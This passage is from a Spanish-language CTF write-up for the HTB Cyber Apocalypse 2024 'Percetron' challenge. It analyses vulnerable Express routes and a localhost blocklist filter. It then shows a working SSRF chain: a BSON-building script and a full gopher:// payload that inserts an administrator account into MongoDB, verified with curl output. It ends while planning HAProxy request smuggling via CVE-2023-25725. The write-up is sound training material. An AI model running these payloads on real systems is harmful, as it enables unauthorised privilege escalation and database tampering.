</code></pre></div><p>Como se puede ver, el <em>endpoint</em> <code>/register</code> establece nuestro permiso a <code>user</code>. Nos gustaría tener permiso de <code>administrator</code> porque necesitamos pasar el <code>AdminMiddleware</code> para continuar con la explotación:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">module</span><span class="mtk1">.</span><span class="mtk7 mtki">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">, </span><span class="mtk9 mtki">next</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">req</span><span class="mtk1">.session.loggedin </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.permission </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">"administrator"</span><span class="mtk1">) {</span>  
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Not allowed"</span><span class="mtk1">});</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">};</span>
</code></pre></div><p>Vale la pena mencionar que el <em>endpoint</em> <code>/login</code> es vulnerable a inyección NoSQL porque los parámetros <code>username</code> y <code>password</code> se envían directamente a MongoDB, sin verificar si son <em>strings</em>. Sin embargo, esto es inútil porque la base de datos está vacía al principio, por lo que no podemos simplemente iniciar sesión como <code>administrator</code>.</p><p>Hay dos <em>endpoints</em> interesantes que nos permiten realizar peticiones a una URL dada (<code>challenge/routes/generic.js</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> axios </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"axios"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"express"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">Router</span><span class="mtk1">();</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> authMiddleware </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"../middleware/auth"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> { check, getUrlStatusCode } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"../util/generic"</span><span class="mtk1">);</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"/"</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"/panel"</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"/healthcheck"</span><span class="mtk1">, authMiddleware, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">targetUrl</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">query</span><span class="mtk1">.url;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">targetUrl</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">json</span><span class="mtk1">({ </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Mandatory URL not specified"</span><span class="mtk1"> });</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">check</span><span class="mtk1">(</span><span class="mtk1">targetUrl</span><span class="mtk1">)) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">403</span><span class="mtk1">).</span><span class="mtk8">json</span><span class="mtk1">({ </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Access to URL is denied"</span><span class="mtk1"> });</span>
<span class="mtk1">  }</span>

<span class="mtk1">  axios.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk1">targetUrl</span><span class="mtk1">, { </span><span class="mtk1">maxRedirects</span><span class="mtk1">: </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk8">validateStatus</span><span class="mtk1">: () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">, </span><span class="mtk1">timeout</span><span class="mtk1">: </span><span class="mtk6">40000</span><span class="mtk1"> })</span>  
<span class="mtk1">    .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">resp</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk9 mtki">resp</span><span class="mtk1">.status).</span><span class="mtk8">send</span><span class="mtk1">();</span>
<span class="mtk1">    })</span>
<span class="mtk1">    .</span><span class="mtk8">catch</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">();</span>
<span class="mtk1">    });</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"/healthcheck-dev"</span><span class="mtk1">, authMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">targetUrl</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">query</span><span class="mtk1">.url;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">targetUrl</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">json</span><span class="mtk1">({ </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Mandatory URL not specified"</span><span class="mtk1"> });</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">getUrlStatusCode</span><span class="mtk1">(</span><span class="mtk1">targetUrl</span><span class="mtk1">)</span>
<span class="mtk1">    .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">statusCode</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk9 mtki">statusCode</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">();</span>
<span class="mtk1">    })</span>
<span class="mtk1">    .</span><span class="mtk8">catch</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">();</span>
<span class="mtk1">    });</span>
<span class="mtk1">});</span>

<span class="mtk1">module</span><span class="mtk1">.</span><span class="mtk1">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1">;</span>
</code></pre></div><p>Ambos <em>endpoints</em> son bastante similares, pero hay algunas diferencias. Por un lado, <code>/healthcheck</code>:</p><ul><li>Usa <code>axios</code>, que es una librería que permite usar esquemas <code>http</code>, <code>https</code>, <code>file</code> y <code>data</code> (más información en <a target="_blank" href="https://github.com/axios/axios/blob/main/lib/platform/node/index.js">axios</a>)</li><li><code>axios</code> está configurado con <code>maxRedirects = 0</code></li><li>Solo obtendremos el código de estado HTTP como salida</li><li>La URL se verifica utilizando la siguiente función:</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">exports</span><span class="mtk1">.</span><span class="mtk8">check</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">url</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">parsed</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">URL</span><span class="mtk1">(</span><span class="mtk9 mtki">url</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isNaN</span><span class="mtk1">(</span><span class="mtk7">parseInt</span><span class="mtk1">(</span><span class="mtk1">parsed</span><span class="mtk1">.</span><span class="mtk1">port</span><span class="mtk1">))) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">parsed</span><span class="mtk1">.</span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"1337"</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">parsed</span><span class="mtk1">.</span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"3000"</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">parsed</span><span class="mtk1">.</span><span class="mtk1">pathname</span><span class="mtk1">.</span><span class="mtk8">toLowerCase</span><span class="mtk1">().</span><span class="mtk8">includes</span><span class="mtk1">(</span><span class="mtk4">"healthcheck"</span><span class="mtk1">)) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">bad</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk4">"localhost"</span><span class="mtk1">, </span><span class="mtk4">"127"</span><span class="mtk1">, </span><span class="mtk4">"0177"</span><span class="mtk1">, </span><span class="mtk4">"000"</span><span class="mtk1">, </span><span class="mtk4">"0x7"</span><span class="mtk1">, </span><span class="mtk4">"0x0"</span><span class="mtk1">, </span><span class="mtk4">"@0"</span><span class="mtk1">, </span><span class="mtk4">"[::]"</span><span class="mtk1">, </span><span class="mtk4">"0:0:0"</span><span class="mtk1">, </span><span class="mtk4">"①②⑦"</span><span class="mtk1">];</span>  
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">bad</span><span class="mtk1">.</span><span class="mtk8">some</span><span class="mtk1">(</span><span class="mtk9 mtki">w</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk1">parsed</span><span class="mtk1">.</span><span class="mtk1">hostname</span><span class="mtk1">.</span><span class="mtk8">toLowerCase</span><span class="mtk1">().</span><span class="mtk8">includes</span><span class="mtk1">(</span><span class="mtk9 mtki">w</span><span class="mtk1">))) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Por otro lado, tenemos <code>/healthcheck-dev</code>:</p><ul><li>No verifica la URL</li><li>Ejecuta <code>curl</code> con parámetros específicos, de modo que solo obtenemos el código de estado HTTP:</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">exports</span><span class="mtk1">.</span><span class="mtk8">getUrlStatusCode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">url</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">((</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">curlArgs</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk4">"-L"</span><span class="mtk1">, </span><span class="mtk4">"-I"</span><span class="mtk1">, </span><span class="mtk4">"-s"</span><span class="mtk1">, </span><span class="mtk4">"-o"</span><span class="mtk1">, </span><span class="mtk4">"/dev/null"</span><span class="mtk1">, </span><span class="mtk4">"-w"</span><span class="mtk1">, </span><span class="mtk4">"%{http_code}"</span><span class="mtk1">, </span><span class="mtk9 mtki">url</span><span class="mtk1">];</span>  
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk8">execFile</span><span class="mtk1">(</span><span class="mtk4">"curl"</span><span class="mtk1">, </span><span class="mtk1">curlArgs</span><span class="mtk1">, (</span><span class="mtk9 mtki">error</span><span class="mtk1">, </span><span class="mtk9 mtki">stdout</span><span class="mtk1">, </span><span class="mtk9 mtki">stderr</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">error</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">error</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">statusCode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">parseInt</span><span class="mtk1">(</span><span class="mtk9 mtki">stdout</span><span class="mtk1">, </span><span class="mtk6">10</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">statusCode</span><span class="mtk1">);</span>
<span class="mtk1">    });</span>
<span class="mtk1">  });</span>
<span class="mtk1">}</span>
</code></pre></div><p>Sin embargo, hay un HA-Proxy frente al servidor Express, que bloquea explícitamente cualquier petición a <code>/healthcheck-dev</code> (<code>conf/haproxy.conf</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">global
    log /dev/log local0
    log /dev/log local1 notice
    maxconn 4096
    user haproxy
    group haproxy
defaults
    mode http
    timeout connect 5000
    timeout client 10000
    timeout server 10000
frontend http-in
    bind *:1337
    default_backend forward_default
backend forward_default
    http-request deny if { path -i -m beg /healthcheck-dev }  
    server s1 127.0.0.1:3000
</code></pre></div><p>Básicamente, tenemos esta estructura:</p><p><img alt="Percetron 2" src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-2.webp"></p><p>Podemos dejar el análisis del código fuente aquí hasta que tengamos un usuario con permiso de <code>administrator</code>.</p><h2 id="explotación-de-ssrf">Explotación de SSRF</h2><p>El objetivo aquí es insertar un usuario <code>administrator</code> en MongoDB. Para esto, debemos usar <em>Server-Side Request Forgery</em> (SSRF) con uno de los <em>endpoints</em> de <code>/healthcheck</code> o <code>/healthcheck-dev</code>.</p><h3 id="mongodb-_wire-protocol_">MongoDB <em>Wire Protocol</em></h3><p>Mientras investigaba cómo realizar SSRF a MongoDB, encontré un <a target="_blank" href="https://brycec.me/posts/dicectf_2023_challenges#unfinished"><em>write-up</em> del DiceCTF 2023</a> que usaba <a target="_blank" href="https://www.mongodb.com/docs/v3.4/reference/mongodb-wire-protocol/">MongoDB <em>Wire Protocol</em></a> mediante <code>telnet</code>. Tomé el <em>script</em> para generar el <em>payload</em> de BSON desde ahí y modifiqué la consulta para insertar un usuario <code>administrator</code> (la contraseña es <code>asdf</code>, aplicando <code>bcrypt</code> como función <em>hash</em>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> BSON </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'bson'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">fs</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'fs'</span><span class="mtk1">);</span>

<span class="mtk3">// Serialize a document</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">doc</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span><span class="mtk1">insert</span><span class="mtk1">: </span><span class="mtk4">"users"</span><span class="mtk1">, </span><span class="mtk1">$db</span><span class="mtk1">: </span><span class="mtk4">"percetron"</span><span class="mtk1">, </span><span class="mtk1">documents</span><span class="mtk1">: [{</span>
<span class="mtk1">    </span><span class="mtk4">"username"</span><span class="mtk1">: </span><span class="mtk4">"administrator"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"password"</span><span class="mtk1">: </span><span class="mtk4">"$2a$10$yPklsGI8uhnptd0TP.rUBuwFM1yLjnguL3bTaQ7j3q</span><span class="mtk4">WFsUIbUKbUC"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"permission"</span><span class="mtk1">: </span><span class="mtk4">"administrator"</span><span class="mtk1">,</span>
<span class="mtk1">}]};</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> BSON.</span><span class="mtk8">serialize</span><span class="mtk1">(</span><span class="mtk1">doc</span><span class="mtk1">);</span>

<span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">beginning</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">from</span><span class="mtk1">(</span><span class="mtk4">"5D0000000000000000000000DD0700000000000000"</span><span class="mtk1">, </span><span class="mtk4">"hex"</span><span class="mtk1">);</span>  
<span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">full</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">concat</span><span class="mtk1">([</span><span class="mtk1">beginning</span><span class="mtk1">, </span><span class="mtk1">data</span><span class="mtk1">]);</span>

<span class="mtk1">full</span><span class="mtk1">.</span><span class="mtk8">writeUInt32LE</span><span class="mtk1">(</span><span class="mtk1">full</span><span class="mtk1">.</span><span class="mtk7">length</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk8 mtku">fs</span><span class="mtk1">.</span><span class="mtk8">writeFileSync</span><span class="mtk1">(</span><span class="mtk4">"bson.bin"</span><span class="mtk1">, </span><span class="mtk1">full</span><span class="mtk1">);</span>
</code></pre></div><p>En este punto, en el <a target="_blank" href="https://brycec.me/posts/dicectf_2023_challenges#unfinished"><em>write-up</em></a> usan <code>curl</code> con el esquema <code>telnet://</code> para enviar el <em>payload</em> como un cuerpo de petición. Esta vez, no podemos hacer eso porque <code>/healthcheck-dev</code> ejecuta <code>curl</code> sin datos, solo con la URL.</p><h3 id="protocolo-gopher">Protocolo Gopher</h3><p>Pero recuerdo de ediciones anteriores de HTB Cyber Apocalypse que <code>curl</code> soporta el esquema <code>gopher://</code>, Entonces podemos realizar lo mismo usando esta URL:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">gopher://0.0.0.0:27017/_%dc%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00%c7%00%00%00%02%69%6e%73%65%72%74%00%06%00%00%00%75%73%65%72%73%00%02%24%64%62%00%0a%00%00%00%70%65%72%63%65%74%72%6f%6e%00%04%64%6f%63%75%6d%65%6e%74%73%00%92%00%00%00%03%30%00%8a%00%00%00%02%75%73%65%72%6e%61%6d%65%00%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%02%70%61%73%73%77%6f%72%64%00%3d%00%00%00%24%32%61%24%31%30%24%79%50%6b%6c%73%47%49%38%75%68%6e%70%74%64%30%54%50%2e%72%55%42%75%77%46%4d%31%79%4c%6a%6e%67%75%4c%33%62%54%61%51%37%6a%33%71%57%46%73%55%49%62%55%4b%62%55%43%00%02%70%65%72%6d%69%73%73%69%6f%6e%00%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%00%00%00  
</code></pre></div><p>Podemos verificar que funcione dentro del contenedor de Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> ps -a | <span class="code-dark-green">grep</span> percetron
67a4897960f1   web_<span class="code-red">percetron</span>                     "/entrypoint.sh"         9 minutes ago   Up 9 minutes              0.0.0.0:1337-&gt;1337/tcp, :::1337-&gt;1337/tcp   web_<span class="code-red">percetron</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> exec -it 67a4897960f1 sh
/app # mongo percetron --eval 'db.users.find().pretty()' --quiet
{
        "_id" : ObjectId("65f2e6e2a642b8770e443027"),
        "username" : "asdf",
        "password" : "$2a$10$t8DVP9VhCCqz5tyEIBDcNevEYWfc2UPHXNTZKBVNaojbjlQn4OHuO",
        "permission" : "user",
        "__v" : 0
}
/app # curl gopher://0.0.0.0:27017/_%dc%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00%c7%00%00%00%02%69%6e%73%65%72%74%00%06%00%00%00%75%73%65%7
2%73%00%02%24%64%62%00%0a%00%00%00%70%65%72%63%65%74%72%6f%6e%00%04%64%6f%63%75%6d%65%6e%74%73%00%92%00%00%00%03%30%00%8a%00%00%00%02%75%73%65%72%6e%61%6d%65%
00%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%02%70%61%73%73%77%6f%72%64%00%3d%00%00%00%24%32%61%24%31%30%24%79%50%6b%6c%73%47%49%38%75%68%6e%70%74
%64%30%54%50%2e%72%55%42%75%77%46%4d%31%79%4c%6a%6e%67%75%4c%33%62%54%61%51%37%6a%33%71%57%46%73%55%49%62%55%4b%62%55%43%00%02%70%65%72%6d%69%73%73%69%6f%6e%0
0%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%00%00%00
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: &lt;FILE&gt;" to save to a file.
/app # mongo percetron --eval 'db.users.find().pretty()' --quiet
{
        "_id" : ObjectId("65f2e6e2a642b8770e443027"),
        "username" : "asdf",
        "password" : "$2a$10$t8DVP9VhCCqz5tyEIBDcNevEYWfc2UPHXNTZKBVNaojbjlQn4OHuO",
        "permission" : "user",
        "__v" : 0
}
{
        "_id" : ObjectId("65f2e84e82006b0cb78b8168"),
        "username" : "administrator",
        "password" : "$2a$10$yPklsGI8uhnptd0TP.rUBuwFM1yLjnguL3bTaQ7j3qWFsUIbUKbUC",
        "permission" : "administrator"
}
</code></pre></div><p>Perfecto, así que vemos que necesitamos alcanzar <code>/healthchec-dev</code>, porque <code>axios</code> no soporta <code>gopher://</code>.</p><h3 id="intentos-fallidos">Intentos fallidos</h3><p>Una idea que tuvimos es intentar de alguna manera realizar SSRF desde <code>/healthcheck</code> hacia <code>/healthcheck-dev</code>. Pero esto no es posible porque la función <code>check</code> nos bloqueará y también, la petición no lleva nuestra <em>cookie</em> de sesión, así que <code>AuthMiddleware</code> bloqueará la petición a <code>/healthcheck-dev</code>.</p><p>Por lo tanto, debemos saltarnos el HA-Proxy. Una opción es tratar de confundir los analizadores de URL, de modo que HA-Proxy no vea <code>/healthcheck-dev</code> but Express sí. Después de varios <em>paths</em> como <code>//healthcheck-dev</code> o <code>/./healtcheck-dev</code>, entre otros <em>payloads</em> similares, descubrimos que no es posible en Express.</p><h3 id="http-_request-smuggling_">HTTP <em>request smuggling</em></h3><p>Otra cosa a considerar es la versión de HA-Proxy. El contenedor de Docker está usando una imagen <code>haproxy:2.3-alpine</code>. La versión específica es 2.3.21:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/app # haproxy -v
HA-Proxy version 2.3.21-3ce4ee0 2022/07/27 - https://haproxy.org/
Status: End of life - please upgrade to branch 2.4.
Known bugs: http://www.haproxy.org/bugs/bugs-2.3.21.html
Running on: Linux 5.15.0-94-generic #104-Ubuntu SMP Tue Jan 9 15:25:40 UTC 2024 x86_64  
</code></pre></div><p>Si echamos un vistazo a la URL anterior, veremos que no hay errores conocidos, pero si lo vemos simplemente en la versión <a target="_blank" href="http://www.haproxy.org/bugs/bugs-2.3.html">2.3</a>, veremos muchos. Además, si buscamos vulnerabilidades de HA-Proxy versión 2.3, veremos una gran cantidad de CVE que podrían ser explotables. Sin embargo, solo unos pocos tenían prueba de concepto, y no funcionaron.</p><p>El CVE que finalmente funcionó es <a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2023-25725">CVE-2023-25725</a> lo que puede dar como resultado un ataque de HTTP <em>request smuggling</em>. Este <em>exploit</em> nos permitirá enviar una petición a HA-Proxy que se interprete como dos solicitudes por Express. Como resultado, podemos incluir la petición a <code>/healthcheck-dev</code> y realizar la consulta anterior a MongoDB.</p><p>El principal problema que tuvimos aquí es que no hay prueba de concepto de este CVE. Solo estaba el <a target="_blank" href="https://git.haproxy.org/?p=haproxy.git;a=commitdiff;h=a8598a2"><em>issue</em> de Git</a> con un ejemplo. De hecho, descargamos el código fuente de HA-Proxy que se está ejecutando en el contenedor de Docker y verificamos que las correcciones no estaban ahí. Entonces, confirmamos que el HA-Proxy era vulnerable a esto.</p><p>Mientras probaba algunas técnicas de HTTP <em>request smugglibg</em> en Burp-Suite, ejecuté <code>tcpdump</code> Dentro del contenedor para ver cómo le estaban llegando los mensajes HTTP a Express:</p><p><img alt="Percetron 3" 